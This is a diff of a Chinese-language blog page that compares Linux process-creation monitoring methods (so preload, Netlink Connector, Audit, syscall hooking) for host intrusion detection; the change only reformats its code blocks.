 <p><img src="https://blog.arstercz.com/images/articles/201910/linux-sysdig.png"></p>
@@ -544,64 +404,43 @@ filter_chain = exclude_uid:992;exclude_comm:mysql,mongo,redis-cli
 <p>eBPF 仅适用于 Linux 4.1+ 的版本, 在 kernel-4.10 之后的支持才相对全面, 线上在使用的时候尽量选择较高内核版本的发行版(比如 Centos 8, Debian 10 等)。另外 Readhat&#x2F;Centos 7 从 7.6 (3.10.0-940.el7.x86_64) 版本开始支持 eBPF 特性, 不过内核版本较低, 并没有支持所有的特性</p>
 <h3 id="4-进程创建监控"><a href="#4-进程创建监控" class="headerlink" title="4. 进程创建监控"></a>4. 进程创建监控</h3><h4 id="a-So-preload方式"><a href="#a-So-preload方式" class="headerlink" title="a. So preload方式"></a>a. So preload方式</h4><p>可以通过 so preload 来覆盖 libc.so 中的 execve等函数来监控进程的创建</p>
 <p><strong>背景知识</strong></p>
-<pre><code>1) Linux 中大部分的可执行程序是动态链接的，常用的有关进程执行的函数例如 execve均实现在 libc.so 这个动态链接库中。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) Linux 中大部分的可执行程序是动态链接的，常用的有关进程执行的函数例如 execve均实现在 libc.so 这个动态链接库中。</span><br><span class="line"></span><br><span class="line">2) Linux 提供了一个 so preload 的机制，允许定义优先加载的动态链接库，方便使用者有选择地载入不同动态链接库中的相同函数。</span><br></pre></td></tr></table></figure>
 
-2) Linux 提供了一个 so preload 的机制，允许定义优先加载的动态链接库，方便使用者有选择地载入不同动态链接库中的相同函数。
-</code></pre>
 <p><strong>优点</strong></p>
-<pre><code>轻量级，只修改库函数代码，不与内核进行交互
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">轻量级，只修改库函数代码，不与内核进行交互</span><br></pre></td></tr></table></figure>
+
 <p><strong>缺点</strong></p>
-<pre><code>1) 只能检测在 preload 之后创建的进程
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1) 只能检测在 preload 之后创建的进程</span><br><span class="line"></span><br><span class="line">如bash 所需的动态链接库在其开始运行时就已确定，所以后续添加的 preload 并不会影响到当前 bash </span><br><span class="line"></span><br><span class="line">2）无法监控静态链接的程序</span><br><span class="line"></span><br><span class="line">一些恶意软件为了降低对环境的依赖性，用的是静态链接，不会加载共享库，这种情况下So preload监控方式会失效</span><br><span class="line"></span><br><span class="line">3）容易被攻击者发现并篡改</span><br><span class="line"></span><br><span class="line">一些蠕虫木马本身也会向 /etc/ld.so.preload 中写入后门，以方便其对机器的持久控制，这种情况下这种监控方式会失效</span><br><span class="line"></span><br><span class="line">4）攻击者可通过 int80 绕过 libc 直接调用系统调用，使这种监控方式失效</span><br></pre></td></tr></table></figure>
 
-如bash 所需的动态链接库在其开始运行时就已确定，所以后续添加的 preload 并不会影响到当前 bash 
-
-2）无法监控静态链接的程序
-
-一些恶意软件为了降低对环境的依赖性，用的是静态链接，不会加载共享库，这种情况下So preload监控方式会失效
-
-3）容易被攻击者发现并篡改
-
-一些蠕虫木马本身也会向 /etc/ld.so.preload 中写入后门，以方便其对机器的持久控制，这种情况下这种监控方式会失效
-
-4）攻击者可通过 int80 绕过 libc 直接调用系统调用，使这种监控方式失效
-</code></pre>
 <h4 id="b-Netlink-Connector"><a href="#b-Netlink-Connector" class="headerlink" title="b. Netlink Connector"></a>b. Netlink Connector</h4><p>Netlink 是一个套接字家族（socket family），它被用于内核与用户态进程以及用户态进程之间的 IPC 通信。</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/tree/master/drivers/connector">Netlink Connector</a> 是一种 Netlink ，它的 Netlink 协议号是 NETLINK_CONNECTOR，其中 connectors.c 和 cnqueue.c 是 Netlink Connector 的实现代码，而 cnproc.c 是一个应用实例，名为进程事件连接器，可以通过该连接器来实现对进程创建的监控</p>
 <p><strong>优点</strong></p>
-<pre><code>轻量级，在用户态即可获得内核提供的信息。
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">轻量级，在用户态即可获得内核提供的信息。</span><br></pre></td></tr></table></figure>
+
 <p><strong>缺点</strong></p>
-<pre><code>仅能获取到 pid ，详细信息需要查 /proc/&lt;pid&gt;/，对于瞬时创建的进程，可能有数据丢失
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仅能获取到 pid ，详细信息需要查 /proc/&lt;pid&gt;/，对于瞬时创建的进程，可能有数据丢失</span><br></pre></td></tr></table></figure>
+
 <h4 id="c-Audit"><a href="#c-Audit" class="headerlink" title="c. Audit"></a>c. Audit</h4><p>Linux Audit 是 Linux 内核中用来进行审计的组件，可监控系统调用和文件访问，架构如下：</p>
 <p><img src="https://d34u8crftukxnk.cloudfront.net/slackpress/prod/sites/7/1_UA09f_6GXUFMGPTARrIoOw.png"></p>
-<pre><code>1) 用户通过用户态的管理进程配置规则（如图中的 go-audit ，也可替换为常用的 auditd ），并通过 Netlink 套接字通知给内核。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) 用户通过用户态的管理进程配置规则（如图中的 go-audit ，也可替换为常用的 auditd ），并通过 Netlink 套接字通知给内核。</span><br><span class="line"></span><br><span class="line">2) 内核中的 kauditd 通过 Netlink 获取到规则并加载。</span><br><span class="line"></span><br><span class="line">3) 应用程序在调用系统调用和系统调用返回时都会经过 kauditd ，kauditd 会将这些事件记录下来并通过 Netlink 回传给用户态进程。</span><br><span class="line"></span><br><span class="line">4) 用户态进程解析事件日志并输出</span><br></pre></td></tr></table></figure>
 
-2) 内核中的 kauditd 通过 Netlink 获取到规则并加载。
-
-3) 应用程序在调用系统调用和系统调用返回时都会经过 kauditd ，kauditd 会将这些事件记录下来并通过 Netlink 回传给用户态进程。
-
-4) 用户态进程解析事件日志并输出
-</code></pre>
 <p><strong>优点</strong></p>
-<pre><code>1) 组件完善，使用 auditd 软件包中的工具即可满足大部分需求，无需额外开发代码。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) 组件完善，使用 auditd 软件包中的工具即可满足大部分需求，无需额外开发代码。</span><br><span class="line"></span><br><span class="line">2) 相比于 Netlink Connector ，获取的信息更为全。</span><br></pre></td></tr></table></figure>
 
-2) 相比于 Netlink Connector ，获取的信息更为全。
-</code></pre>
 <p><strong>缺点</strong></p>
-<pre><code>性能消耗随着进程数量提升有所上升，需要通过添加白名单等配置来限制其资源占用
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">性能消耗随着进程数量提升有所上升，需要通过添加白名单等配置来限制其资源占用</span><br></pre></td></tr></table></figure>
+
+
 <h4 id="d-Syscall-hook"><a href="#d-Syscall-hook" class="headerlink" title="d. Syscall hook"></a>d. Syscall hook</h4><p>可以通过安装内核模块的方式来对系统调用进行 hook来监控进程创建</p>
 <p><strong>原理</strong></p>
-<pre><code>目前常用的 hook 方法是通过修改 sys_call_table（ Linux 系统调用表）来实现，具体原理是系统在执行系统调用时是通过系统调用号在 sys_call_table中找到相应的函数进行调用，所以只要将 sys_call_table中 execve对应的地址改为我们安装的内核模块中的函数地址即可
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目前常用的 hook 方法是通过修改 sys_call_table（ Linux 系统调用表）来实现，具体原理是系统在执行系统调用时是通过系统调用号在 sys_call_table中找到相应的函数进行调用，所以只要将 sys_call_table中 execve对应的地址改为我们安装的内核模块中的函数地址即可</span><br></pre></td></tr></table></figure>
+
 <p><strong>优点</strong></p>
-<pre><code>高定制化，从系统调用层面获取完整信息
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">高定制化，从系统调用层面获取完整信息</span><br></pre></td></tr></table></figure>
+
 <p><strong>缺点</strong></p>
-<pre><code>兼容性差，需针对不同发行版和内核版本进行定制和测试
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">兼容性差，需针对不同发行版和内核版本进行定制和测试</span><br></pre></td></tr></table></figure>
+
 <h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/12049910.html">https://www.cnblogs.com/LittleHann/p/12049910.html</a></p>
 </li>
